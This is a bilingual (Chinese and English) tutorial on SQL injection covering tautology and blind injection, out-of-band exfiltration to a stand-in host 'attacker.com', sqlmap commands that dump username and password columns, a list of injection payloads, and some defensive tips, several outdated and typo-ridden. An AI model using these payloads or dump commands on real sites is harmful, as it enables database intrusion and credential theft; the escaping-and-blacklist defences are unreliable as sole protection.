# SQL Injections (SQLi)

![](http://i.imgur.com/AcVJKT2.png)

* SQL通过构建查询语句来工作，这些语句的目的是为了变得方便阅读和直观。


* SQL查询搜索可以很容易地进行操作，并假设SQL查询搜索是可靠的命令。这意味着SQL搜索可以通过存取控制机制来传递，而不被注意。
* 通过使用转移标准身份验证和检查授权凭证的方法，您可以访问存储在数据库中的重要信息。

* 开发:
	- 从数据库中转储内容。
	- 插入新数据。
	- 修改现有的数据。
	- 写入磁盘。

## 举个最简单的例子

传递给用户名的参数:

```
SELECT * FROM users WHERE
name="$name";
```

在这种情况下，攻击者只需要引入一个真正的逻辑表达式 ```1=1```:

```
SELECT * FROM users WHERE 1=1;
```
因此**WHERE**子句总是被执行，这意味着它将返回与所有用户匹配的值。

现在估计只有不到5%的网站有这样的漏洞。

这些类型的缺陷有助于其他攻击的发生，例如XSS或缓冲区溢出。

## SQL 盲注

* 推断:当数据没有返回并/或详细的错误消息被禁用时，这是有用的技术。我们可以根据页面响应的某些属性对两个状态进行区分。

* 据估计，超过20%的网站都有这样的移除。

* 在传统的SQLi中，可以通过攻击者编写有效负载来揭示信息。在盲目的SQLi中，攻击者需要询问服务器是否为真或假。例如，您可以请求一个用户。如果用户存在，它将载入网站，所以这是真的。

* 基于时间的技术:基于延迟的数据库查询(sleep()、等待延迟等)来推断。

```
IF SYSTEM_USER="john" WAIFOR DELAY '0:0:15'
```

* 基于响应的技术(真或假):基于响应的文本进行推断。例子:

```
SELECT count (*) FROM reviews WHERE author='bob' (true)
SELECT count (*) FROM reviews WHERE author='bob' and '1'='1' (true)
SELECT count (*) FROM reviews WHERE author='bob' and '1'='2' (false)
SELECT count (*) FROM reviews WHERE author='bob' and SYSTEM_USER='john' (false)
SELECT count (*) FROM reviews WHERE author='bob' and SUBSTRING(SYSTEM_USER,1,1)='a' (false)
SELECT count (*) FROM reviews WHERE author='bob' and SUBSTRING(SYSTEM_USER,1,1)='c' (true)
```
(并继续进行迭代，直到找到systemuser的值)。

* 利用HTTP响应之外的传输。

```
SELECT * FROM  reviews WHERE review_author=UTL_INADDR.GET_HOST_ADDRESS((select user from dual ||'.attacker.com'));
INSERT into openowset('sqloledb','Network=DBMSSOCN; Address=10.0.0.2,1088;uid=gds574;pwd=XXX','SELECT * from tableresults') Select name,uid,isntuser from master.dbo.sysusers--
```

### 常见的方法开发
* 每当你看到一个URL，**问号**后面跟着某种类型的字母或单词，就意味着一个值从一个页面发送到另一个页面。

* 在这个例子里
```
http://www.website.com/info.php?id=10
```
页面 *info.php* 正在接收数据，并将有一些像这样的代码:
```
$id=$_post['id'];
```
以及一个相关的SQL查询:
```
QueryHere = "select * from information where code='$id'"
```



#### 检查漏洞
我们可以通过在URL的结尾附加一个简单的 ```'``` 来验证目标是否脆弱。

```
http://www.website.com/info.php?id=10'
```

如果该网站返回以下错误:

		You have an error in your SQL syntax...

这意味着这个网站很容易受到SQL的攻击。

#### 找到数据库的结构
要找到数据库中列和表的数量，我们可以使用 [Python's SQLmap](http://sqlmap.org/).

This application streamlines the SQL injection process by automating the detection and exploitation of SQL injection flaws of a database. There are several automated mechanisms to find the database name, table names, and number of columns.

* ORDER BY: it tries to order all columns form x to infinity. The iteration stops when the response shows that the input column x does not exist, reveling the value of x.

* UNION: it gathers several data located in different table columns. The automated process tries to gather all information contained in columns/table x,y,z obtained by ORDER BY. The payload is similar to:

```
?id=5'%22union%22all%22select%221,2,3
```

* Normally the databases are defined with names such as: user, admin, member, password, passwd, pwd, user_name. The injector uses a trial and error technique to try to identify the name:

```
?id=5'%22union%22all%22select%221,2,3%22from%22admin
```
So, for example, to find the database name, we run the *sqlmap* script with target *-u* and enumeration options *--dbs* (enumerate DBMS databases):

```
$ ./sqlmap.py -u <WEBSITE> --dbs
(...)
[12:59:20] [INFO] testing if URI parameter '#1*' is dynamic
[12:59:22] [INFO] confirming that URI parameter '#1*' is dynamic
[12:59:23] [WARNING] URI parameter '#1*' does not appear dynamic
[12:59:25] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[12:59:25] [INFO] testing for SQL injection on URI parameter '#1*'
[12:59:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:59:27] [WARNING] reflective value(s) found and filtering out
[12:59:51] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'
[13:00:05] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[13:00:16] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'
(...)
```

#### Gaining access to the Database

* From this we can verify what databases we have available, for example. From this we can find out how many tables exist, and their respective names. The sqlmap command is:

```
./sqlmap -u <WEBSITE> --tables <DATABASE-NAME>
```

* The main objective is to find  usernames and passwords in order to gain access/login to the site, for example in a table named *users*. The sqlmap command is

```
./sqlmap -u <WEBSITE> --columns -D <DATABASE-NAME> -T <TABLE-NAME>
```

This will return information about the columns in the given table.

* Now we can dump all the data of all columns using the flag ```-C``` for column names:

```
./sqlmap -u <WEBSITE> --columns -D <DATABASE-NAME> -T <TABLE-NAME> -C 'id,name,password,login,email' --dump
```

If the password are clear text (not hashed in md5, etc), we have access to the website.

## Basic SQL Injection Exploit Steps

1. Fingerprint database server.
2. Get an initial working exploit. Examples of payloads:
	- '
	- '--
	- ')--
	- '))--
	- or '1'='1'
	- or '1'='1
	- 1--
3. Extract data through UNION statements:
	- NULL: use as a column place holder helps with data type conversion errors
	- GROUP BY - help determine number of columns
4. Enumerate database schema.
5. Dump application data.
6. Escalate privilege and pwn the OS.






## Some Protection Tips

* Never connect to a database as a super user or as a root.
* Sanitize any user input. PHP has several functions that validate functions such as:
	- is_numeric()
	- ctype_digit()
	- settype()
	- addslahes()
	- str_replace()
* Add quotes ```"``` to all non-numeric input values that will be passed to the database by using escape chars functions:
	- mysql_real_escape_string()
	- sqlit_escape_string()

```php
$name = 'John';
$name = mysql_real_escape_string($name);
$SQL = "SELECT * FROM users WHERE username='$name'";
```

* Always perform a parse of data that is received from the user (POST and FORM methods).
	- The chars to be checked:```", ', whitespace, ;, =, <, >, !, --, #, //```.
	- The reserved words: SELECT, INSERT, UPDATE, DELETE, JOIN, WHERE, LEFT, INNER, NOT, IN, LIKE, TRUNCATE, DROP, CREATE, ALTER, DELIMITER.

* Do not display explicit error messages that show the request or a part of the SQL request. They can help fingerprint the RDBMS(MSSQL, MySQL).

* Erase user accounts that are not used (and default accounts).

* Other tools: blacklists, AMNESIA, Java Static Tainting, Codeigniter.

